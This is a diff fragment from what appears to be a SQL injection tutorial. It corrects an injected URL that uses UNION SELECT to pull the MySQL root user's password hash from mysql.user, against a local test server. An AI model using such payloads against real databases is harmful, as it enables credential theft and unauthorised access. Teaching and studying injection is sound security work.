@@ -17,7 +17,7 @@ So, getting that password.
 Let say that the user is "*root*". We could inject this:
 
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,(SELECT authentication_string FROM mysql.user WHERE user = 'root'),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,(SELECT authentication_string FROM mysql.user WHERE user = 'root'),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 > **Note:** Depending on the version of the MySQL server **authentication_string** may be **password**.
